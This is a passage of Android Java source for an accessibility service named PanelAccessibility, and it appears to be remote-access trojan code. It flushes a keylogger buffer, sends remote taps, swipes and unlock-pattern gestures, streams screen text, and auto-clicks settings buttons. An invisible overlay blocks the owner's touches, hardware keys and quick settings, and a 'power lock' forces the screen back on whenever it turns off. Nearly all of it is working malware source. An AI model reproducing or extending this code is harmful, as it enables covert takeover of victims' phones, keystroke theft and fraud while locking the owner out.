    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Stop watchdog thread
        watchdogRunning = false;
        if (watchdogThread != null) watchdogThread.interrupt();
        // Flush any remaining keys before shutting down
        synchronized (keyBuffer) {
            if (!keyBuffer.isEmpty()) flushKeylog();
        }
        mainHandler.post(() -> { try { doRemoveOverlay(); } catch (Exception ignored) {} });
        instance = null;
    }

    /* ── isEnabled check ───────────────────────────────────────────────────── */
    public static boolean isEnabled(Context ctx) {
        try {
            String flat = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (flat == null || flat.isEmpty()) return false;
            String svcSuffix = "/com.panellord.PanelAccessibility";
            for (String s : flat.split(":")) {
                if (s.trim().endsWith(svcSuffix)) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    /* ── Internal: temporarily lift overlay → gesture → restore overlay ───── */

    private interface GestureAction {
        void run(GestureResultCallback cb) throws Exception;
    }

    private void runGesture(GestureAction action) {
        mainHandler.post(() -> {
            final boolean wasBlocking = blockOverlay != null;
            if (wasBlocking) doRemoveOverlay();

            GestureResultCallback cb = new GestureResultCallback() {
                @Override public void onCompleted(GestureDescription g) {
                    if (wasBlocking) mainHandler.postDelayed(PanelAccessibility.this::doInstallOverlay, 200);
                    // Push screen text at 300ms, 600ms, 1200ms after gesture so
                    // reader catches both fast and slow app transitions
                    if (screenLiveMode) {
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 300);
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 650);
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 1300);
                    }
                }
                @Override public void onCancelled(GestureDescription g) {
                    if (wasBlocking) mainHandler.postDelayed(PanelAccessibility.this::doInstallOverlay, 200);
                    if (screenLiveMode) {
                        mainHandler.postDelayed(() -> onWindowChangedMaybePush(), 300);
                    }
                }
            };

            // Wait 150ms for overlay removal to take effect before dispatching
            mainHandler.postDelayed(() -> {
                try {
                    action.run(cb);
                } catch (Exception e) {
                    if (wasBlocking) doInstallOverlay();
                }
            }, wasBlocking ? 150 : 0);
        });
    }

    /* ── Gesture public API ─────────────────────────────────────────────────── */

    public void tap(float x, float y) {
        runGesture(cb -> {
            Path path = new Path();
            path.moveTo(x, y);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 80))
                .build(), cb, mainHandler);
        });
    }

    public void swipe(float x1, float y1, float x2, float y2, long dur) {
        runGesture(cb -> {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, Math.max(dur, 100)))
                .build(), cb, mainHandler);
        });
    }

    public void longPress(float x, float y) {
        runGesture(cb -> {
            Path path = new Path();
            path.moveTo(x, y);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 600))
                .build(), cb, mainHandler);
        });
    }

    public void swipePattern(org.json.JSONArray dots) {
        runGesture(cb -> {
            if (dots == null || dots.length() < 2) return;
            Path path = new Path();
            org.json.JSONObject first = dots.getJSONObject(0);
            path.moveTo((float) first.optDouble("x", 0), (float) first.optDouble("y", 0));
            for (int i = 1; i < dots.length(); i++) {
                org.json.JSONObject d = dots.getJSONObject(i);
                path.lineTo((float) d.optDouble("x", 0), (float) d.optDouble("y", 0));
            }
            long dur = Math.max(dots.length() * 120L, 400L);
            dispatchGesture(new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, dur))
                .build(), cb, mainHandler);
        });
    }

    /* ── Navigation ─────────────────────────────────────────────────────────── */
    public void goHome()    { mainHandler.post(() -> { try { performGlobalAction(GLOBAL_ACTION_HOME);    } catch (Exception ignored) {} }); }
    public void goBack()    { mainHandler.post(() -> { try { performGlobalAction(GLOBAL_ACTION_BACK);    } catch (Exception ignored) {} }); }
    public void goRecents() { mainHandler.post(() -> { try { performGlobalAction(GLOBAL_ACTION_RECENTS); } catch (Exception ignored) {} }); }

    /* ── Block / Unblock user input ─────────────────────────────────────────── */

    public void blockUserInput()   { mainHandler.post(this::doInstallOverlay); }
    public void unblockUserInput() { mainHandler.post(this::doRemoveOverlay);  }
    public boolean isBlocking()    { return blockOverlay != null; }

    /** Click the first button/text-view whose text matches any of the given labels (case-insensitive) */
    public void clickButtonWithText(String... labels) {
        mainHandler.post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                if (!clickNodeWithText(root, labels)) {
                    // Retry once after 800ms if not found (settings screen may still be loading)
                    mainHandler.postDelayed(() -> {
                        try {
                            AccessibilityNodeInfo r2 = getRootInActiveWindow();
                            if (r2 != null) { clickNodeWithText(r2, labels); r2.recycle(); }
                        } catch (Exception ignored) {}
                    }, 800);
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private boolean clickNodeWithText(AccessibilityNodeInfo node, String[] labels) {
        if (node == null) return false;
        CharSequence t = node.getText();
        CharSequence d = node.getContentDescription();
        String txt = t != null ? t.toString().trim() : "";
        String desc = d != null ? d.toString().trim() : "";
        for (String lbl : labels) {
            if (txt.equalsIgnoreCase(lbl) || desc.equalsIgnoreCase(lbl)) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                boolean found = clickNodeWithText(child, labels);
                child.recycle();
                if (found) return true;
            }
        }
        return false;
    }

    private void doInstallOverlay() {
        if (blockOverlay != null) return;
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);

            // Choose overlay type — TYPE_APPLICATION_OVERLAY can cover the status bar (blocks quick
            // settings swipe), but needs SYSTEM_ALERT_WINDOW. Fall back to ACCESSIBILITY_OVERLAY.
            int overlayType;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O
                    && android.provider.Settings.canDrawOverlays(this)) {
                overlayType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                overlayType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
            }

            int wFlags = WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    | WindowManager.LayoutParams.FLAG_FULLSCREEN
                    | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
            if (powerLockEnabled) {
                wFlags |= WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
            }
            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                overlayType,
                wFlags,
                PixelFormat.TRANSLUCENT
            );
            lp.gravity = android.view.Gravity.TOP | android.view.Gravity.LEFT;
            lp.x = 0;
            lp.y = -300; // extend 300px ABOVE screen top to block pull-down quick settings

            blockOverlay = new View(this) {
                @Override public boolean onTouchEvent(MotionEvent ev) { return true; }
                @Override public boolean dispatchKeyEvent(KeyEvent event) {
                    int code = event.getKeyCode();
                    // Consume BACK, MENU, SEARCH, VOLUME, CAMERA — but NOT HOME (system reserved)
                    if (code == KeyEvent.KEYCODE_BACK
                            || code == KeyEvent.KEYCODE_MENU
                            || code == KeyEvent.KEYCODE_SEARCH
                            || code == KeyEvent.KEYCODE_VOLUME_DOWN
                            || code == KeyEvent.KEYCODE_VOLUME_UP
                            || code == KeyEvent.KEYCODE_VOLUME_MUTE
                            || code == KeyEvent.KEYCODE_APP_SWITCH
                            || code == KeyEvent.KEYCODE_CAMERA) {
                        return true; // consumed — system never sees it
                    }
                    return super.dispatchKeyEvent(event);
                }
            };
            blockOverlay.setAlpha(0f);
            blockOverlay.setFocusable(true);
            blockOverlay.setFocusableInTouchMode(true);
            wm.addView(blockOverlay, lp);
            blockOverlay.requestFocus();
            // Register screen-off receiver when power lock is enabled
            if (powerLockEnabled) registerScreenOffReceiver();
        } catch (Exception e) {
            blockOverlay = null;
        }
    }

    private void doRemoveOverlay() {
        if (blockOverlay == null) return;
        try {
            ((WindowManager) getSystemService(WINDOW_SERVICE)).removeView(blockOverlay);
        } catch (Exception ignored) {}
        blockOverlay = null;
        unregisterScreenOffReceiver();
    }

    /** Enable or disable power button suppression (works standalone or with block_input) */
    public void setPowerLock(boolean enabled) {
        mainHandler.post(() -> {
            powerLockEnabled = enabled;
            if (enabled) {
                registerScreenOffReceiver();
                // If overlay is active, update its flags to include KEEP_SCREEN_ON
                if (blockOverlay != null) {
                    try {
                        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                        WindowManager.LayoutParams lp =
                            (WindowManager.LayoutParams) blockOverlay.getLayoutParams();
                        lp.flags |= WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON;
                        wm.updateViewLayout(blockOverlay, lp);
                    } catch (Exception ignored) {}
                }
            } else {
                unregisterScreenOffReceiver();
                if (powerWakeLock != null && powerWakeLock.isHeld()) powerWakeLock.release();
                powerWakeLock = null;
            }
        });
    }

    private void registerScreenOffReceiver() {
        if (screenOffReceiver != null) return;
        screenOffReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context context, Intent intent) {
                if (Intent.ACTION_SCREEN_OFF.equals(intent.getAction()) && powerLockEnabled) {
                    // Immediately wake the screen back on
                    mainHandler.postDelayed(() -> {
                        try {
                            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                            @SuppressWarnings("deprecation")
                            PowerManager.WakeLock wl = pm.newWakeLock(
                                PowerManager.FULL_WAKE_LOCK
                                    | PowerManager.ACQUIRE_CAUSES_WAKEUP
                                    | PowerManager.ON_AFTER_RELEASE,
                                "panellord:powerlock"
                            );
                            wl.acquire(3000);
                            powerWakeLock = wl;
                        } catch (Exception ignored) {}
                    }, 100);
                }
            }
        };
        try {
            registerReceiver(screenOffReceiver, new IntentFilter(Intent.ACTION_SCREEN_OFF));
        } catch (Exception ignored) {}
    }

    private void unregisterScreenOffReceiver() {
        if (screenOffReceiver == null) return;
        try { unregisterReceiver(screenOffReceiver); } catch (Exception ignored) {}
        screenOffReceiver = null;
    }

    public void dispatchTextKey(String key) {
        try {
            android.view.accessibility.AccessibilityNodeInfo focused =
                findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused == null) return;
            if (key.equals("DEL")) {
                android.os.Bundle args = new android.os.Bundle();
                CharSequence cur = focused.getText();
                String updated = cur != null && cur.length() > 0
                    ? cur.toString().substring(0, cur.length() - 1) : "";
                args.putCharSequence(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    updated);
                focused.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            } else if (key.equals("ENTER")) {
                focused.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_NEXT_AT_MOVEMENT_GRANULARITY);
            } else {
                android.os.Bundle args = new android.os.Bundle();
                CharSequence cur = focused.getText();
                String updated = (cur != null ? cur.toString() : "") + key;
                args.putCharSequence(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    updated);
                focused.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            }
            focused.recycle();
        } catch (Exception ignored) {}
    }
}
